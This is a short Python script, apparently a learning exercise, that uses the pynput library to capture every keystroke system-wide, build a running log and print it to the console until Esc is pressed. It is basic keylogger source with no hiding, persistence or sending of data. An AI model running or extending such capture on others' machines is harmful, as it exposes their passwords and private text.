#!/usr/bin/env python

from pynput import keyboard

log = ""

def on_key_press(key):
    global log
    try:
        log = log + str(key.char)
        print(log)
    except AttributeError:
        if key == keyboard.Key.space:
            log = log + " "
            print(log)
        elif key == keyboard.Key.enter:
            log = log + "\n"
            print(log)
        elif key == keyboard.Key.backspace:
            log = log[:-1]
            print(log)
        elif key == keyboard.Key.esc:
            return False
        else:
            print(key)

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
